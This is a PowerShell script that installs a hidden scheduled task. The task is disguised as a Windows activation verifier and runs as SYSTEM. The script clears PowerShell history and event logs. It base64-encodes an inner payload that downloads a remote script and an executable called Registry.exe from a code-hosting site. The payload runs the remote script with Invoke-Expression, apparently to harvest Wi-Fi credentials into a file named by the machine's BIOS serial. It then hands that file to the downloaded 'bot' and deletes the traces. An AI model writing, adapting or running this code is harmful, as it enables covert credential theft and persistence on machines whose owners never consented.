#variables
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$STName = "Windows Activation Status Verifier"
$taskpath = "\Microsoft\Windows\"

#creating the wrapper.
$rawscript = @'
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$boturl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/Registry.exe"
$squidurl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/WifiRelated/WifiSquid.ps1"
$basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft"
$botpath = Join-Path -Path $basepath -ChildPath "Registry.exe"
$squidpath = Join-Path -Path $basepath -ChildPath "SquidReaper.ps1"
$systemserialno = (Get-WmiObject -Class Win32_BIOS).SerialNumber
$finaloutput = Join-Path -Path $basepath -ChildPath "$systemserialno-reaper.txt"
if (-not (Test-Path -Path $basepath)) {New-Item -ItemType Directory -Path $basepath | Out-Null}
Remove-Item -Path $finaloutput -Confirm:$false -ErrorAction SilentlyContinue
#Remove-Item -Path $squidpath -Confirm:$false -ErrorAction SilentlyContinue
Remove-Item -Path $botpath -Confirm:$false -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri $boturl -OutFile $botpath -UseBasicParsing
Invoke-Expression (Invoke-WebRequest -Uri $squidurl -UseBasicParsing).Content | Out-File $finaloutput
#Invoke-WebRequest -Uri $squidurl -OutFile $squidpath -UseBasicParsing
#Start-Process -FilePath powershell.exe -ArgumentList "-ExecutionPolicy Bypass $squidpath" -RedirectStandardOutput $finaloutput -WindowStyle Hidden -Wait
Start-Process -FilePath $botpath -ArgumentList "-File `"$finaloutput`"" -NoNewWindow -Wait
Start-Sleep 10 | Out-Null
Remove-Item -Path $finaloutput -Confirm:$false -ErrorAction SilentlyContinue
#Remove-Item -Path $squidpath -Confirm:$false -ErrorAction SilentlyContinue
Remove-Item -Path $botpath -Confirm:$false -ErrorAction SilentlyContinue
'@

$bytes = [System.Text.Encoding]::Unicode.GetBytes($rawscript)
$enccmd = [Convert]::ToBase64String($bytes)
$STAction = New-ScheduledTaskAction `
    -Execute 'powershell.exe' `
    -Argument "-NoProfile -WindowStyle Hidden -EncodedCommand $enccmd"

$STTrigger = New-ScheduledTaskTrigger `
    -Once -At ([DateTime]::Now.AddSeconds(5)) `
    -RepetitionInterval (New-TimeSpan -Minutes 60) `
    -RepetitionDuration (New-TimeSpan -Days 1)

$STSettings = New-ScheduledTaskSettingsSet `
    -Compatibility Win8 `
    -MultipleInstances IgnoreNew `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -Hidden 

if (Get-ScheduledTask -TaskName $STName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $STName -Confirm:$false
}

Register-ScheduledTask -TaskPath $taskpath -Action $STAction -Trigger $STTrigger -Settings $STSettings -TaskName $STName -Description "Cleans up the system." -User "NT AUTHORITY\SYSTEM" -RunLevel Highest | Out-Null
Start-ScheduledTask -TaskPath $taskpath -TaskName $STName  -ErrorAction SilentlyContinue | Out-Null
Start-Sleep 90 | Out-Null
Unregister-ScheduledTask -TaskName $STName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null